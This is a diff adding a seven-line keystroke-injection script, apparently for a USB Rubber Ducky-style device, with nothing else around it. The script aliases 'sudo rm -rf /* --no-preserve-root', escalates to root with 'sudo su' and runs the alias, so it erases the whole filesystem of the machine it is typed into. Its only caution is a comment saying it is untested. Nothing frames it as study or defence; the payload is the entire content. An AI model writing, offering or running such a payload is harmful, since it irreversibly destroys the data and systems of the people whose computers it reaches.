@@ -1,0 +1,7 @@
+REM This has not been tested. Use at your own risk
+DELAY 100
+alias hawktuah="sudo rm -rf /* --no-preserve-root"
+DELAY 100
+sudo su
+DELAY 100
+hawktuah
